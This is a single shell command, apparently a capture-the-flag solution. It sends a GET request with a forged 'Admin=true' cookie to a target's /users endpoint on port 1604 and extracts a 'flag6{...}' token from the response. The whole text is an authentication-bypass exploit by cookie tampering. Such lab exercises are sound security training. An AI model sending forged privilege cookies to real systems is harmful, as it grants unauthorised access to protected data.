curl -s -N -X GET -H 'Cookie: Admin=true' $1:1604/users | grep -o 'flag6{.*}'
